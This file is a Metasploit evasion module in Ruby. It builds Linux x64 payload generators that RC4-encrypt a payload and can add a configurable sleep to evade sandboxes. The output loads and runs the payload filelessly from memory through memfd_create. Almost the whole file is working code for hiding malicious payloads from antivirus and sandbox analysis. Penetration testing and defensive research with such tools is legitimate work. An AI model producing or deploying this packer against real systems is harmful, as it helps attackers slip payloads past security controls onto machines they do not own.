##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  include Msf::Payload::Linux::X64::Rc4Decrypter
  include Msf::Payload::Linux::X64::SleepEvasion
  include Msf::Payload::Linux::X64::ElfLoader

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux RC4 Encrypted Payload Generator',
        'Description' => %q{
          This evasion module packs Linux payloads using RC4 encryption
          and executes them from memory using memfd_create for fileless execution.
          Linux kernel version support: 3.17+
        },
        'Author' => ['Massimo Bertocchi'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => [ARCH_X64],
        'Targets' => [['Linux x64', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'Output filename', 'payload.elf']),
      OptInt.new('SLEEP_TIME', [false, 'Sleep seconds for sandbox evasion', 0]),
    ])
  end

  def run
    raw_payload = payload.encoded
    if raw_payload.blank?
      fail_with(Failure::BadConfig, 'Failed to generate payload')
    end

    elf_payload = Msf::Util::EXE.to_linux_x64_elf(framework, raw_payload)
    complete_loader = sleep_evasion(seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
    final_elf = Msf::Util::EXE.to_linux_x64_elf(framework, complete_loader)

    File.binwrite(datastore['FILENAME'], final_elf)
    File.chmod(0o755, datastore['FILENAME'])
  end
end
